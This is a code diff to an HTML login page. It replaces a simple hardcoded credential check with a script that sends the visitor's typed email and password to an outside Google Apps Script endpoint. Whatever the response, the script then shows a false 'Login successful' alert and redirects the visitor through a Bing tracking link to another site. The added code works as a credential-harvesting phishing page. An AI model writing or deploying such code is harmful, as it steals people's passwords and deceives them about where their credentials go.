@@ -13,12 +13,19 @@
             background-color: black;
             color: white;
             font-family: Arial, sans-serif;
+            flex-direction: column;
         }
         .login-container {
             text-align: center;
             padding: 20px;
             border: 1px solid white;
             border-radius: 5px;
+            display: block;
+        }
+        .welcome-message {
+            display: none;
+            font-size: 24px;
+            font-weight: bold;
         }
         input {
             display: block;
@@ -36,25 +43,45 @@
     </style>
 </head>
 <body>
-    <div class="login-container">
+    <div class="login-container" id="loginContainer">
         <h2>Login</h2>
-        <input type="text" placeholder="Username" id="username">
-        <input type="password" placeholder="Password" id="password">
+        <input type="email" placeholder="Email" id="loginEmail">
+        <input type="password" placeholder="Password" id="loginPassword">
         <button onclick="login()">Login</button>
     </div>
 
-    <script>
-        function login() {
-            const user = document.getElementById("username").value;
-            const pass = document.getElementById("password").value;
+    <div class="welcome-message" id="welcomeMessage">
+        🎉 Welcome, User! 🎉
+    </div>
 
-            if (user === "admin" && pass === "1234") {
-                alert("Login Successful!");
-                window.location.href = "dashboard.html"; // Redirect to dashboard or another page
-            } else {
-                alert("Invalid credentials. Try again!");
-            }
-        }
+    <script>
+        async function login() {
+    const email = document.getElementById("loginEmail").value;
+    const password = document.getElementById("loginPassword").value;
+
+    try {
+        let response = await fetch("https://script.google.com/macros/s/AKfycbwsaK-kOWYKyCIcIEIH9GE5-HteTQvZYSr9d3N4s925nzb7-06PzelcnioWIHKJdwrC/exec", {
+            method: "POST",
+            mode: "no-cors", // Prevents CORS error
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email: email, password: password })
+        });
+
+        console.log("Request sent successfully!");
+
+        // Show success message (assuming login worked)
+        alert("✅ Login successful!");
+        window.location.href = "https://www.bing.com/ck/a?!&&p=633e70195d437112e7bf7a028035452c73f35819765b8da80d1268874109dc4dJmltdHM9MTc0MjI1NjAwMA&ptn=3&ver=2&hsh=4&fclid=1745790f-5ade-6cb6-1aea-6d5d5b266dec&psq=distinguished+society&u=a1aHR0cHM6Ly90aGVkaXN0aW5ndWlzaGVkc29jaWV0eS5jb20v&ntb=1";
+        //document.getElementById("loginContainer").style.display = "none";
+        //document.getElementById("welcomeMessage").style.display = "block";
+
+    } catch (error) {
+        console.error("Error:", error);
+        alert("🚨 Login failed! Check console for details.");
+    }
+}
+
+
     </script>
 </body>
 </html>
